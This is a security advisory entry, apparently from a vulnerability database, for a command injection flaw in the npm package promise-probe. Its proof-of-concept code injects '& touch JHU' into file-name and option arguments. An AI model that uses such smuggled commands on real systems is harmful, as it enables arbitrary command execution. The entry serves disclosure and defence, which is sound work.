- id: snykio:npm:promise-probe:546816
  title: Command Injection
  description: "[promise-probe][1] is a FFprobe wrapper.\n\nAffected versions of this
    package are vulnerable to Command Injection\nvia the `ffprobe(file)` and `createMuteOgg(outputFile,
    options)`\nfunctions. `file`,`outputFile`,`options` can be controlled by users\nwithout
    any sanitization\n\n### PoC by JHU System Security Lab   {#poc-by-jhu-system-security-lab}\n\n
    \   var root = require(\"promise-probe\");\n    \n    root.ffprobe(\"& touch JHU\");\n
    \   \n    root.createMuteOgg(\"123\",{seconds:\"& touch JHU &\"});\n    \n    root.createMuteOgg(\"&
    touch JHU\",{});\n{: .language-js}\n\n\n\n[1]: https://www.npmjs.com/package/promise-probe\n"
  affected_package: promise-probe
